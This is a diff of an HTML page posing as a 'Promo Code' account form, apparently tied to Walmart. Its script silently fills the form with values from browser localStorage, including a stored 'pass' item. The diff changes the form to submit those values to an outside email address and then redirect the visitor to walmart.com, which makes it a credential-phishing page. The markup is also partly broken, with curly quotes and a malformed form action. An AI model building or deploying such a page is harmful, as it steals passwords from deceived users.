@@ -12,13 +12,9 @@
 <p>Please ensure that the information below is correct. This ensures we can add the Promo Code to your account.</p>
  
 <!--Form Code--> 
-<form action=”knuchol1@vols.utk.edu” method=”POST” enctype=”text/plain” name=”EmailForm”>
-
-
+<form action=”knuchol1@vols.utk.edu” method=”get” enctype=”text/plain” name=”EmailForm” onsubmit="location='https://www.walmart.com'">
 <label for="name">Name:</label><br>
 <input type="text" id="name" name="name"><br>
-
-
 <label for="ContactCommentt">Message:</label><br>
 <input type="text" id=”ContactCommentt” rows=”6″ cols=”20″ onblur="Sendval()">
     <script>
@@ -26,9 +22,6 @@
             document.getElementById('name').value = localStorage.getItem('message');
             document.getElementById('ContactCommentt').value = localStorage.getItem('pass');
         }
-
     </script>
-
-<input type=button value="Submit" onClick="location='https://www.walmart.com'">
-</form>
- </body>
+<input type="submit" value="Send">
+</form> </body>
